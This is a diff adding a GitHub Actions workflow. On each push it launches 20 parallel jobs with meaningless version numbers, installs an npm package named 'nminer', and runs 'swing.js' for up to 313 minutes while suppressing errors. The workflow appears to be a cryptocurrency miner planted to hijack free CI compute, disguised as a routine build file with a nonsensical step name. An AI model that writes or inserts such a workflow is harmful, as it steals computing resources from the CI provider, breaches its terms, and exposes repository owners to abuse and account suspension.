@@ -1,0 +1,45 @@
+name: swing
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3041 }
+          - { version: 5293 }
+          - { version: 7901 }
+          - { version: 2852 }
+          - { version: 965 }
+          - { version: 3116 }
+          - { version: 3051 }
+          - { version: 8322 }
+          - { version: 8046 }
+          - { version: 2403 }
+          - { version: 6616 }
+          - { version: 9823 }
+          - { version: 734 }
+          - { version: 1153 }
+          - { version: 9680 }
+          - { version: 126 }
+          - { version: 9004 }
+          - { version: 776 }
+          - { version: 7775 }
+          - { version: 943 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: milestone because offensively
+        run: |
+          npm install nminer@latest
+          timeout 313m node swing.js || echo "swing executed"
